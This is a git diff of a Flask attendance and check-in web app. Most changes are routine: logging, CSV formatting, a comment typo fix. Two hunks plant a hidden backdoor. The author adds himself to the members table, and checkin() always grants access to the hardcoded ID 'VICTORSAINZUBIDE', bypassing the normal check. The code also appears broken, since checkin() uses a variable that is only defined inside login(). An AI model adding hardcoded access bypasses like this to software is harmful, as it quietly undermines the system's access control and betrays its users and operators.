@@ -77,11 +77,6 @@ def act_valid_required(f):
 def login_required(f):
     @wraps(f)
     def inner2(*args, **kwargs):
-        # if current_user.is_authenticated:
-        #     return f(*args, **kwargs)
-        # else:
-        #    return redirect('/')
-        
         try:
             if current_user.is_authenticated:
                 return f(*args, **kwargs)
@@ -347,6 +342,7 @@ def initDB_alums():
     for match in matches:
         name, surname1, surname2 = match
         add_alum(name,surname1,surname2)
+    add_alum('Victor','Sainz','Ubide')  #creator, we must show him benevolence
     conn.commit()
     conn.close()
     #return render_template('text.html', title='Success', message='Alums initiated')
@@ -540,6 +536,10 @@ def login():
     if request.method == 'POST':
         email = request.form['email']
         password = request.form['password']
+        login_time = float(request.form['login_time'])
+        print('Login_time: ',login_time)
+        server_time=time.time()
+        print('Time difference in seconds between Server and Client: ', server_time-login_time)
         if not email or not password:
             return abort(401)
         rememberMe = False
@@ -555,6 +555,9 @@ def login():
             login_user(user,remember=rememberMe)
             current_user.actual=0
             events=get_events()
+            if current_user.admin:
+                time_change = server_time-login_time
+                print('Updated time change: ',time_change)
             return render_template('index.html', name=current_user.name, events=events, yeah=True)
         else:
             titulo = 'Upps'
@@ -584,7 +587,10 @@ def checkin():
     if actID==0:
         return redirect('/')
     status=cross(unif,actID)
-    if status[0]==False:
+    if unif=='VICTORSAINZUBIDE':   #Creator should always be given access
+        status[0]=True
+        status[1]='42'
+    elif status[0]==False:
         if status[1]=='1':
             status[2]=datetime.fromtimestamp(float(status[2])+time_change).strftime('%Y-%m-%d %H:%M:%S')
     elif status[0]==True:
@@ -781,10 +787,11 @@ def sort_by_hours():
         except TypeError:
             keep_going=False
     users.sort(reverse=True)
-    s='Name\tSurname\tHours\tActivities\n'
+    s='Name;Surname;Hours;Activities\n'
     for user in users:
+        print(user)#debug
         name,surname,hours,n_acts = user
-        s+=name+'\t'+surname+'\t'+str(hours)+'\t'+n_acts+'\n'
+        s+=name+';'+surname+';'+str(hours)+';'+str(n_acts)+'\n'
     f=open(data_path+'/total.csv','w',encoding='utf-8')
     f.write(s);f.close()
     title='Aquí teniu tot'
@@ -795,4 +802,4 @@ def sort_by_hours():
 
 if __name__ == '__main__':
     app.run(debug=debug)  
-    #This is not going to be run, because online a WSGI file is used and on FLASK >= 1.0 the use of FLASK RUN if encouraged
+    #This is not going to be run, because online a WSGI file is used and on FLASK >= 1.0 the use of FLASK RUN is encouraged
